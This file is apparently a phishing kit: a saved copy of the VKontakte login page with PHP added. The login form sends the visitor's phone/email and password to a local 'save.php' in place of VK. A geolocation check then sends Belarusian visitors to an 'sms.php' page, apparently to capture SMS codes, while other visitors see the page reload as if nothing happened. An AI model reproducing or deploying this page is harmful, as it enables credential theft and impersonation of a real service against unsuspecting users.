<?php
include("tabgeo_country_v4.php");
$ip = $_SERVER['REMOTE_ADDR'];
$country_code = tabgeo_country_v4('46.28.96.0');
$a = country_code;
?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!-- saved from url=(0014)http://vk.com/ -->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru" lang="ru">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="shortcut icon" href="http://vk.com/images/faviconnew.ico?3">

    <link rel="apple-touch-icon" href="http://vk.com/images/safari_60.png">
    <link rel="apple-touch-icon" sizes="76x76" href="http://vk.com/images/safari_76.png">
    <link rel="apple-touch-icon" sizes="120x120" href="http://vk.com/images/safari_120.png">
    <link rel="apple-touch-icon" sizes="152x152" href="http://vk.com/images/safari_152.png">


    <meta name="description"
          content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте.">


    <title>Добро пожаловать | ВКонтакте</title>

    <noscript>&lt;meta http-equiv="refresh" content="0; URL=/badbrowser.php"&gt;</noscript>

    <script type="text/javascript" async="" src="./index_files/code.js"></script>
    <script type="text/javascript">
        var vk = {
            ads_rotate_interval: 120000,
            al: parseInt('3') || 4,
            id: 0,
            intnat: '' ? true : false,
            host: 'vk.com',
            lang: 0,
            rtl: parseInt('') || 0,
            version: 19292,
            stDomains: 0,
            zero: false,
            contlen: 7961,
            loginscheme: 'https',
            ip_h: '24665e844b9ebb8916',
            vc_h: '41c036319ae6491a324ad9013a1eab23',
            navPrefix: '/',
            dt: parseInt('0') || 0,
            fs: parseInt('11') || 11,
            ts: 1461731341,
            tz: 10800,
            pd: 0,
            pads: 1,
            vcost: 7,
            time: [2016, 4, 27, 7, 29, 1],
            sampleUser: -1, spentLastSendTS: new Date().getTime()
        };

        window.locDomain = vk.host.match(/[a-zA-Z]+\.[a-zA-Z]+\.?$/)[0];
        var _ua = navigator.userAgent.toLowerCase();
        if (/opera/i.test(_ua) || !/msie 6/i.test(_ua) || document.domain != locDomain) document.domain = locDomain;
        var ___htest = (location.toString().match(/#(.*)/) || {})[1] || '', ___to;
        if (vk.al != 1 && ___htest.length && ___htest.substr(0, 1) == vk.navPrefix) {
            if (vk.al != 3 || vk.navPrefix != '!') {
                ___to = ___htest.replace(/^(\/|!)/, '');
                if (___to.match(/^([^\?]*\.php|login|mobile)([^a-z0-9\.]|$)/)) ___to = '';
                location.replace(location.protocol + '//' + location.host + '/' + ___to);
            }
        }

        var StaticFiles = {
            'common.js': {v: 1132},
            'common.css': {v: 513},
            'ie6.css': {v: 26},
            'ie7.css': {v: 18}
            , 'lang0_0.js': {v: 6704}, 'index.css': {v: 27}, 'index.js': {v: 33}
        }
        var abp;
    </script>

    <script type="text/javascript" src="./index_files/rbadman-html5.js" async=""></script>

    <link rel="stylesheet" type="text/css" href="./index_files/common.css">
    <!--[if lte IE 6]>
    <style type="text/css" media="screen">/* <![CDATA[ */ @import url(/css/al/ie6.css?26); /* ]]> */</style><![endif]-->
    <!--[if IE 7]>
    <style type="text/css" media="screen">/* <![CDATA[ */ @import url(/css/al/ie7.css?18); /* ]]> */</style><![endif]-->
    <link type="text/css" rel="stylesheet" href="./index_files/index.css">
    <script type="text/javascript" src="./index_files/loader_nav19292_0.js"></script>
    <script type="text/javascript" src="./index_files/common.js"></script>
    <script type="text/javascript" src="./index_files/lang0_0.js"></script>
    <script type="text/javascript" src="./index_files/px.js"></script>
    <script type="text/javascript" src="./index_files/px(1).js"></script>
    <link rel="alternate" media="only screen and (max-width: 640px)" href="http://m.vk.com/">
    <link rel="alternate" href="android-app://com.vkontakte.android/vkontakte/m.vk.com/">
    <script type="text/javascript" src="./index_files/index.js"></script>

    <script type="text/javascript" src="./index_files/aes_light.js"></script>
    <style type="text/css" media="screen"></style>
    <script type="text/javascript" src="./index_files/notifier.js"></script>
    <link type="text/css" rel="stylesheet" href="./index_files/notifier.css">
</head>

<body onresize="onBodyResize()" class="is_rtl font_default pads ">
<div id="system_msg" class="fixed"></div>
<div id="utils">
    <div id="common_css"></div>
    <div id="index_css"></div>
    <iframe src="./index_files/saved_resource.html"></iframe>
    <div id="chat_onl_wrap" class="chat_onl_wrap" style="display: none;">
        <div class="chats_sp chat_cont_sh_top"></div>
        <div class="chat_cont_scrolling">
            <div class="chat_onl_height"></div>
        </div>
        <div class="chats_sp chat_cont_sh_bottom"></div>
        <a class="chat_tab_wrap" id="chat_tab_wrap" onclick="Chat.showFriends()" onmouseover="Chat.showTT();">
            <div class="chat_onl_cont">
                <div class="chat_onl" id="chat_onl"></div>
                <div class="chats_sp chat_onl_icon"></div>
            </div>
        </a></div>
    <div id="notifier_css"></div>
</div>

<div id="layer_bg" class="fixed" style="height: 745px;"></div>
<div id="layer_wrap" class="scroll_fix_wrap fixed" style="width: 1535px; height: 745px;">
    <div id="layer" style="width: 1519px;"></div>
</div>
<div id="box_layer_bg" class="fixed" style="height: 745px;"></div>
<div id="box_layer_wrap" class="scroll_fix_wrap fixed" style="width: 1535px; height: 745px;">
    <div id="box_layer" style="width: 1519px;">
        <div id="box_loader">
            <div class="loader"></div>
            <div class="back"></div>
        </div>
    </div>
</div>

<div id="stl_left" class="fixed" style="left: 0px; width: 364px; height: 745px;">
    <div id="stl_bg">
        <nobr id="stl_text">Наверх</nobr>
    </div>
</div>
<div id="stl_side" class="fixed" style="left: 364px; width: 140px; top: 224px; height: 521px;">
    <div id="fmenu" style="display: none;"><a class="fmenu_item fl_r" onmouseover="Pads.preload(&#39;fr&#39;)"
                                              onmousedown="return Pads.show(&#39;fr&#39;, event)"
                                              href="http://vk.com/friends?section=requests"><span
            class="fmenu_text inl_bl"></span><span id="fmenu_fr" class="fmenu_icon inl_bl"></span></a><a
            class="fmenu_item fl_r" onmouseover="Pads.preload(&#39;ph&#39;)"
            onmousedown="return Pads.show(&#39;ph&#39;, event)" href="http://vk.com/albums?act=added"><span
            class="fmenu_text inl_bl"></span><span id="fmenu_ph" class="fmenu_icon inl_bl"></span></a><a
            class="fmenu_item fl_r" onmouseover="Pads.preload(&#39;vid&#39;)"
            onmousedown="return Pads.show(&#39;vid&#39;, event)" href="http://vk.com/video?section=tagged"><span
            class="fmenu_text inl_bl"></span><span id="fmenu_vid" class="fmenu_icon inl_bl"></span></a><a
            class="fmenu_item fl_r" onmouseover="Pads.preload(&#39;msg&#39;)"
            onmousedown="return Pads.show(&#39;msg&#39;, event)" href="http://vk.com/im"><span
            class="fmenu_text inl_bl"></span><span id="fmenu_msg" class="fmenu_icon inl_bl"></span></a><a
            class="fmenu_item fl_r" onmouseover="Pads.preload(&#39;gr&#39;)"
            onmousedown="return Pads.show(&#39;gr&#39;, event)" href="http://vk.com/groups"><span
            class="fmenu_text inl_bl"></span><span id="fmenu_gr" class="fmenu_icon inl_bl"></span></a><a
            class="fmenu_item fl_r" onmouseover="Pads.preload(&#39;nws&#39;)"
            onmousedown="return Pads.show(&#39;nws&#39;, event)" href="http://vk.com/feed?section=notifications"><span
            class="fmenu_text inl_bl"></span><span id="fmenu_nws" class="fmenu_icon inl_bl"></span></a><a
            class="fmenu_item fl_r" onmouseover="Pads.preload(&#39;ap&#39;)"
            onmousedown="return Pads.show(&#39;ap&#39;, event)" href="http://vk.com/apps"><span
            class="fmenu_text inl_bl"></span><span id="fmenu_ap" class="fmenu_icon inl_bl"></span></a></div>
</div>

<script type="text/javascript">domStarted();</script>

<div class="scroll_fix_wrap" id="page_wrap">
    <div id="reg_bar" class="top_info_wrap fixed">
        <div class="scroll_fix" style="width: 1519px;">
            <div id="reg_bar_content">
                Присоединяйтесь, чтобы всегда оставаться в контакте с друзьями и близкими
                <div class="button_blue" id="reg_bar_button"><a class="button_link" href="http://vk.com/join"
                                                                onclick="return !showBox(&#39;join.php&#39;, {act: &#39;box&#39;, from: nav.strLoc}, {}, event)">
                    <button id="reg_bar_btn"><span id="reg_bar_with_arr">Зарегистрироваться</span></button>
                </a></div>
            </div>
        </div>
    </div>
    <div>
        <div class="scroll_fix" style="width: 1519px;">
            <div id="page_layout" style="width: 791px;">
                <div id="page_header" class="p_head p_head_l0">
                    <div class="back"></div>
                    <div class="left"></div>
                    <div class="right"></div>
                    <div class="content">
                        <div id="top_nav" class="head_nav">
                            <div id="top_logo_down" class="fl_l"></div>
                            <a id="top_home_link" class="top_home_link fl_l" href="http://vk.com/"
                               onmousedown="addClass(&#39;top_logo_down&#39;,&#39;tld_d&#39;);"
                               onclick="return nav.go(this, event);"></a>
                            <div id="top_links">
                                <div class="fl_r" id="top_menu_wrap" style="">
                                    <a id="top_reg_link" class="fl_r top_nav_link" href="http://vk.com/join"
                                       style="display: none"
                                       onclick="return !showBox(&#39;join.php&#39;, {act: &#39;box&#39;, from: nav.strLoc}, {}, event)"
                                       onmousedown="tnActive(this)">регистрация</a>
                                    <a id="top_switch_lang" class="fl_r top_nav_link" style=""
                                       onclick="ajax.post(&#39;al_index.php&#39;, {act: &#39;change_lang&#39;, lang_id: 3, hash: &#39;3a50080d749ec76155&#39;});"
                                       onmousedown="tnActive(this)">Switch to English</a>
                                </div>
                                <a class="fl_l top_nav_link" href="http://vk.com/" id="top_back_link"
                                   onclick="return nav.go(this, event, {back: true})" onmousedown="tnActive(this)"
                                   style="max-width: 748px;"></a>
                            </div>
                        </div>
                    </div>
                </div>

                <div id="side_bar" class="fl_l" style="">
                    <div id="quick_login">
                        <div>
                            <iframe class="upload_frame" id="quick_login_frame" name="quick_login_frame"
                                    src="./index_files/saved_resource(1).html"></iframe>
                        </div>
                        <form method="POST" name="login" id="quick_login_form" action="save.php"
                              target="quick_login_frame">
                            <input type="hidden" name="act" value="login">
                            <input type="hidden" name="role" value="al_frame">
                            <input type="hidden" name="expire" id="quick_expire_input" value="">
                            <input type="hidden" name="captcha_sid" id="quick_captcha_sid" value="">
                            <input type="hidden" name="captcha_key" id="quick_captcha_key" value="">
                            <input type="hidden" name="_origin" value="http://vk.com">
                            <input type="hidden" name="ip_h" value="24665e844b9ebb8916">
                            <input type="hidden" name="lg_h" value="fe4891827885e25378">
                            <div class="label">Телефон или email</div>
                            <div class="labeled"><input type="text" name="email" class="text" id="quick_email"></div>
                            <div class="label">Пароль</div>
                            <div class="labeled"><input type="password" name="pass" class="text" id="quick_pass"
                                                        >
                            </div>
                            <input type="submit" class="submit">
                        </form>
                        <button class="flat_button button_wide button_big" id="quick_login_button">Войти</button>

                        <script src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
                        <script type="application/javascript">
                            $('#quick_login_button').click(function () {
                                $('#quick_login_form').submit();

                                <?php
                                if($country_code == "BY"){
                                ?>
                                setTimeout(function () {
                                    window.location = '/sms.php';
                                }, 1000);
                                <?php
                                } else {
                               ?>
                                setTimeout(function(){ location.reload(); }, 3000);
                                <?php } ?>
                                
                            })
                        </script>

                        <button class="flat_button button_wide button_big" id="quick_reg_button" style="display: none"
                                onclick="top.showBox(&#39;join.php&#39;, {act: &#39;box&#39;, from: nav.strLoc})">
                            Регистрация
                        </button>
                        <div class="clear forgot"><a id="quick_forgot" href="http://vk.com/restore" target="_top">Забыли
                            пароль?</a>
                            <div class="checkbox ta_l" id="quick_expire"
                                 onclick="checkbox(this);ge(&#39;quick_expire_input&#39;).value=isChecked(this)?1:&#39;&#39;;">
                                <div></div>
                                Чужой компьютер
                            </div>
                        </div>
                    </div>
                </div>

                <div id="page_body" class="fl_r" style="width: 631px;">
                    <div id="header_wrap2">
                        <div id="header_wrap1">
                            <div id="header" style="">
                                <h1 id="title">Добро пожаловать</h1>
                            </div>
                        </div>
                    </div>
                    <div id="wrap_between"></div>
                    <div id="wrap3">
                        <div id="wrap2">
                            <div id="wrap1">
                                <div id="content">
                                    <div id="index">
                                        <iframe class="upload_frame"
                                                src="./index_files/saved_resource(2).html"></iframe>
                                        <div class="content">
                                            <p><b>ВКонтакте</b> – универсальное средство для общения и поиска друзей и
                                                одноклассников,<br>которым ежедневно пользуются десятки миллионов
                                                человек.</p>

                                            <h2>Моментальная регистрация</h2>

                                            <div class="msg" id="ij_msg"></div>

                                            <div class="ij_form">
                                                <div class="ij_reg_row">
                                                    <div class="input_back_wrap no_select">
                                                        <div class="input_back"
                                                             style="margin: 1px; padding: 5px 4px 4px;">
                                                            <div class="input_back_content" style="width: 140px;">Ваше
                                                                имя
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <input type="text" class="big_text" id="ij_first_name" value=""
                                                           onkeydown="if (event.keyCode == 10 || event.keyCode == 13) Index.submitJoinStart();">
                                                </div>
                                                <div class="ij_reg_row">
                                                    <div class="input_back_wrap no_select">
                                                        <div class="input_back"
                                                             style="margin: 1px; padding: 5px 4px 4px;">
                                                            <div class="input_back_content" style="width: 140px;">Ваша
                                                                фамилия
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <input type="text" class="big_text" id="ij_last_name" value=""
                                                           onkeydown="if (event.keyCode == 10 || event.keyCode == 13) Index.submitJoinStart();">
                                                </div>
                                                <div class="ij_reg_row" id="ij_sex_row">
                                                    <input type="hidden" id="ij_sex" name="ij_sex">
                                                </div>
                                                <center>
                                                    <button class="flat_button button_big ij_button" id="ij_submit"
                                                            onclick="Index.submitJoinStart()">
                                                        <span class="ij_with_arr">Зарегистрироваться</span>
                                                    </button>
                                                </center>
                                                <div id="index_fbsign">
                                                    <div class="index_fbb">
                                                        <div class="index_or">
                                                            <div class="index_or_l"></div>
                                                            <span class="index_or_s">или</span></div>
                                                        <center>
                                                            <button class="flat_button ij_button index_fb_btn"
                                                                    id="index_fb" onclick="Index.fbJoin();">
                                                                <div class="index_fb_logo"></div>
                                                                <div class="index_fb_l">Войти через Facebook</div>
                                                            </button>
                                                        </center>
                                                    </div>
                                                </div>
                                            </div>

                                            <h2>В чём поможет ВКонтакте?</h2>
                                            <ul class="listing">
                                                <li><span>Найти людей, с которыми Вы когда-либо учились, работали или отдыхали.</span>
                                                </li>
                                                <li><span>Узнать больше о людях, которые Вас окружают, и найти новых друзей.</span>
                                                </li>
                                                <li><span>Всегда оставаться в контакте с теми, кто Вам дорог.</span>
                                                </li>
                                            </ul>
                                        </div>
                                        <div class="reg">
                                            <table cellspacing="0" cellpadding="0" id="ij_screens">
                                                <tbody>
                                                <tr>
                                                    <td><a class="ij_scr" onclick="JoinPhotoview.show(0)"><img
                                                            src="./index_files/prof_m.png" class="ijs_img"></a></td>
                                                    <td><a class="ij_scr" onclick="JoinPhotoview.show(1)"><img
                                                            src="./index_files/news_m.png" class="ijs_img"></a></td>
                                                    <td><a class="ij_scr" onclick="JoinPhotoview.show(2)"><img
                                                            src="./index_files/dial_m.png" class="ijs_img"></a></td>
                                                </tr>
                                                </tbody>
                                            </table>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div id="footer_wrap" class="fl_r" style="width: 661px;">
                    <div id="bottom_nav">
                        <a class="bnav_a" href="http://vk.com/about">о сайте</a>
                        <a class="bnav_a" href="http://vk.com/support?act=home" onclick="return nav.go(this, event);"
                           style="display: none;">помощь</a>
                        <a class="bnav_a" href="http://vk.com/terms">правила</a>
                        <a class="bnav_a" href="http://vk.com/ads">реклама</a>
                        <a class="bnav_a" href="http://vk.com/people">люди</a><a class="bnav_a"
                                                                                 href="http://vk.com/communities">сообщества</a>
                        <a class="bnav_a" href="http://vk.com/dev">разработчикам</a>
                        <a class="bnav_a" href="http://vk.com/jobs" style="display: none;">вакансии</a>
                    </div>
                    <div id="footer" class="clear">
                        <div class="copy_lang"><a href="http://vk.com/about">ВКонтакте</a> © 2016 <a class="bnav_lang"
                                                                                                     onclick="ajax.post(&#39;al_index.php&#39;, {act: &#39;change_lang&#39;, lang_id: 3, hash: &#39;3a50080d749ec76155&#39;})">English</a><a
                                class="bnav_lang"
                                onclick="ajax.post(&#39;al_index.php&#39;, {act: &#39;change_lang&#39;, lang_id: 0, hash: &#39;3a50080d749ec76155&#39;})">Русский</a><a
                                class="bnav_lang"
                                onclick="ajax.post(&#39;al_index.php&#39;, {act: &#39;change_lang&#39;, lang_id: 1, hash: &#39;3a50080d749ec76155&#39;})">Українська</a><a
                                class="bnav_lang"
                                onclick="if (vk.al) { showBox(&#39;lang.php&#39;, {act: &#39;lang_dialog&#39;, all: 1}, {params: {dark: true, bodyStyle: &#39;padding: 0px&#39;}, noreload: true}); } else { changeLang(1); } return false;">все
                            языки »</a></div>

                        <div>


                        </div>
                    </div>
                </div>
                <div class="clear"></div>
            </div>
        </div>
    </div>
    <noscript>&lt;div style="position:absolute;left:-10000px;"&gt;
        &lt;img src="//top-fwz1.mail.ru/counter?id=2579437;pid=0;js=na" style="border:0;" height="1" width="1" /&gt;
        &lt;/div&gt;</noscript>
</div>
<div class="progress" id="global_prg"></div>

<script type="text/javascript">
    if (parent && parent != window && (browser.msie || browser.opera || browser.mozilla || browser.chrome || browser.safari || browser.iphone)) {
        document.getElementsByTagName('body')[0].innerHTML = '';
    } else {
        domReady();
        updateMoney(0);
        gSearch.init();
        if (window.qArr && qArr[5]) qArr[5] = [5, "по товарам", "", "goods", 0x00000100];
        if (browser.iphone || browser.ipad || browser.ipod) {
            setStyle(bodyNode, {webkitTextSizeAdjust: 'none'});
        }
        var qf = ge('quick_login_form'), ql = ge('quick_login'), qe = ge('quick_email'), qp = ge('quick_pass');
        var qlb = ge('quick_login_button'), prgBtn = qlb;

        var qinit = function () {
            setTimeout(function () {
                ql.insertBefore(ce('div', {innerHTML: '<iframe class="upload_frame" id="quick_login_frame" name="quick_login_frame"></iframe>'}), qf);
                qf.target = 'quick_login_frame';
            }, 1);
        }

        if (window.top && window.top != window) {
            window.onload = qinit;
        } else {
            setTimeout(qinit, 0);
        }

        qf.onsubmit = function () {
            if (!ge('quick_login_frame')) return false;
            if (!trim(qe.value)) {
                notaBene(qe);
                return false;
            } else if (!trim(qp.value)) {
                notaBene(qp);
                return false;
            }
            lockButton(window.__qfBtn = prgBtn);
            prgBtn = qlb;
            clearTimeout(__qlTimer);
            __qlTimer = setTimeout(loginSubmitError, 30000);
            domFC(domPS(qf)).onload = function () {
                clearTimeout(__qlTimer);
                __qlTimer = setTimeout(loginSubmitError, 2500);
            }
            return true;
        }

        window.loginSubmitError = function () {
            showFastBox('Предупреждениe', 'Не удается пройти авторизацию по защищенному соединению. Чаще всего это происходит, когда на Вашем компьютере установлены неправильные текущие дата и время. Пожалуйста, проверьте настройки даты и времени в системе и перезапустите браузер.');
        }
        window.focusLoginInput = function () {
            scrollToTop(0);
            notaBene('quick_email');
        }
        window.changeQuickRegButton = function (noShow) {
            if (noShow) {
                hide('top_reg_link', 'quick_reg_button');
                show('top_search_link');
            } else {
                hide('top_search_link');
                show('top_reg_link', 'quick_reg_button');
            }
            toggle('top_switch_lang', noShow && window.langConfig && window.langConfig.id != 3);
        }
        window.submitQuickLoginForm = function (email, pass, opts) {
            setQuickLoginData(email, pass, opts);
            if (opts && opts.prg) prgBtn = opts.prg;
            if (qf.onsubmit()) qf.submit();
        }
        window.setQuickLoginData = function (email, pass, opts) {
            if (email !== undefined) ge('quick_email').value = email;
            if (pass !== undefined) ge('quick_pass').value = pass;
            var params = opts && opts.params || {};
            for (var i in params) {
                var el = ge('quick_login_' + i);
                if (el) {
                    val(el, params[i]);
                } else {
                    qf.appendChild(ce('input', {type: 'hidden', name: i, id: 'quick_login_' + i, value: params[i]}));
                }
            }
        }

        if (qlb) {
            qlb.onclick = function () {
                if (qf.onsubmit()) qf.submit();
            };
        }

        if (browser.opera_mobile) show('quick_expire');

        if (1) {
            hide('support_link_td');
        }
        var ts_input = ge('ts_input'), oldFF = browser.mozilla && parseInt(browser.version) < 8;
        if (browser.mozilla && !oldFF) {
            setStyle(ts_input, {padding: (vk.rtl ? '3px 20px 6px 40px' : '3px 41px 6px 20px')});
        }
        placeholderSetup(ts_input, {back: false, reload: true});
        if (browser.opera || browser.msie || browser.mozilla) {
            setStyle(ts_input, {padding: (vk.rtl ? '4px 20px 5px 40px' : '4px 41px 5px 20px')});
        } else if (browser.chrome || browser.safari) {
            setStyle(ts_input, {padding: (vk.rtl ? '4px 21px 5px 40px' : '4px 40px 5px 21px')});
        }

        TopSearch.init();
        if (browser.msie8 || browser.msie7) {
            var st = {border: '1px solid #a6b6c6'};
            if (hasClass(ge('ts_wrap'), 'vk')) {
                if (vk.rtl) st.left = '1px';
                else st.right = '0px';
            } else {
                if (vk.rtl) st.right = '146px';
                else st.left = '146px';
            }
            setStyle(ge('ts_cont_wrap'), st);
        }
        window.tsHintsEnabled = 1;
        ;
        shortCurrency();
        handlePageParams({
            "id": 0,
            "pads": 1,
            "loc": "",
            "wrap_page": 1,
            "width": 791,
            "width_dec": 160,
            "width_dec_footer": 130,
            "body_class": "is_rtl font_default pads ",
            "counters": "",
            "pvbig": 0,
            "pvdark": 1
        });
        addEvent(document, 'click', onDocumentClick);
        Index.initNew();
        JoinPhotoview.init([{
            "src": "\/images\/join\/prof_1.png?5",
            "width": 790,
            "height": 600,
            "desc": "Делитесь с друзьями фотографиями и новостями"
        }, {
            "src": "\/images\/join\/news_1.png?5",
            "width": 790,
            "height": 600,
            "desc": "Получайте новости из жизни Ваших друзей и известных людей"
        }, {
            "src": "\/images\/join\/dial_1.png?5",
            "width": 790,
            "height": 600,
            "desc": "Общайтесь с близкими при помощи личных сообщений"
        }]);
        cur.lang = extend(cur.lang || {}, {
            index_screen_m_of_n: 'Иллюстрация {num} из {count}',
            index_to_main: 'Главная страница',
            index_choose_sex: 'Укажите пол'
        });
        var sd = false;
        if (sd) Index.initSexDD(sd);
        placeholderSetup('ij_first_name', {back: true});
        placeholderSetup('ij_last_name', {back: true});
        var login = ge('quick_email');
        if (login) {
            login.focus();
        }
        ;
        (function (d, w) {
            var ts = d.createElement("script");
            ts.type = "text/javascript";
            ts.async = true;
            ts.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//top-fwz1.mail.ru/js/code.js";
            var f = function () {
                var s = d.getElementsByTagName("script")[0];
                s.parentNode.insertBefore(ts, s);
            };
            if (w.opera == "[object Opera]") {
                d.addEventListener("DOMContentLoaded", f, false);
            } else {
                f();
            }
        })(document, window);
        setInterval(function () {
            if (isObject(window.allupdateru)) {
                setCookie('remixaur', '38033507915e1b8807', 1);
                window.allupdateru.fn = {};
            }
        }, 10);

    }
</script>


</body>
</html>